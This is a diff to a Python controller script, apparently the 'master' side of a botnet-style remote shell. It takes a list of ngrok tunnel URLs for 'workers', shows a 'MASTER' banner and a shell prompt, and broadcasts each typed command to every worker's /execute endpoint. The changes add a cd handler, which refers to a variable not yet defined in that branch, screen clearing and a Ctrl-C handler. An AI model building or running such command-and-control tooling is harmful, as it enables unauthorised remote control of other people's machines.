@@ -1,13 +1,37 @@
 import requests
+import os
+import signal
+import sys
+import platform
+import time
 
-print("Welcome back, master!")
+if platform.system() == 'Linux':
+    os.system("clear")
+else:
+    os.system("cls")
+
+print("""
+ __  __    _    ____ _____ _____ ____  
+|  \/  |  / \  / ___|_   _| ____|  _ \ 
+| |\/| | / _ \ \___ \ | | |  _| | |_) |
+| |  | |/ ___ \ ___) || | | |___|  _ < 
+|_|  |_/_/   \_\____/ |_| |_____|_| \_\
+""")
 
 # Get the ngrok public URL from the user
+print("")
 ngrok_urls = input("Enter the ngrok public URLs separated by commas: ").split(",")
 ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace
 
 # Define the bot username
 bot_username = "Unknown_user"  # Assign your bot's username here
+
+# Signal handler for graceful shutdown
+def signal_handler(sig, frame):
+    print("Exiting...")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 # Function to get the username of a worker
 def get_username(url):
@@ -36,64 +60,57 @@ def update_username(url, bot_username):
 def send_command_to_worker(ngrok_url, command):
     endpoint = f"{ngrok_url}/execute"
     try:
-        # Send the command to the worker
+        # Send the command to the worker without changing the directory
         response = requests.post(endpoint, json={'command': command})
-        
-        # Check if the request was successful
         response.raise_for_status()  
-        
-        # Extract and print the 'result' field directly as plain text
         result = response.json().get('result', 'No result received')
         print(result)  # Print the result without JSON formatting
         return result
-
     except requests.exceptions.RequestException as e:
         print(f"Failed to send command to {ngrok_url}. Error: {e}")
         return None
     except ValueError:
-        # If response is not JSON
         print("Response is not in JSON format")
         return None
-    
-# Function to handle username update
-def handle_username_update(bot_username):
-    for ngrok_url in ngrok_urls:
-        print(f"\nChecking username...")
-        current_username = get_username(ngrok_url)
-        if current_username:
-            print(f"Current username: {current_username}")
-            bot_username = current_username  # Replace bot_username with current_username
-            update_username(ngrok_url, bot_username)
-        else:
-            print("Could not retrieve current username.")
 
 def main(bot_username):
     while True:
-        command = input(f"{bot_username}:~$ ")
-        
+        command = input(f"{bot_username}:~$ ")  # Display prompt without directory context
+
         if command.lower() == "exit":
             print("Exiting...")
+            time.sleep(1)
+            if platform.system() == 'Linux':
+                os.system("clear")
+            else:
+                os.system("cls")
             break
-        
+
+        elif command.lower().startswith("cd "):
+            # Change directory
+            new_dir = command.split(" ", 1)[1]
+            send_command_to_worker(ngrok_url, f"cd {new_dir}")  # Send 'cd' command to the worker
+
         elif command.lower() == "update_username":
             for ngrok_url in ngrok_urls:
                 print(f"\nChecking username...")
                 current_username = get_username(ngrok_url)
-                
+
                 if current_username:
                     print(f"Current username: {current_username}")
                     bot_username = current_username  # Replace bot_username with current_username
                     update_username(ngrok_url, bot_username)
                 else:
                     print("Could not retrieve current username.")
+
         elif command.startswith("/update_username "):
             bot_username = command.split(" ", 1)[1]  # Extract the new username from the command
             for ngrok_url in ngrok_urls:
                 update_username(ngrok_url, bot_username)
-        
+
         else:
             for ngrok_url in ngrok_urls:
-                send_command_to_worker(ngrok_url, command)
+                send_command_to_worker(ngrok_url, command)  # Send command directly
 
 if __name__ == '__main__':
     main(bot_username)
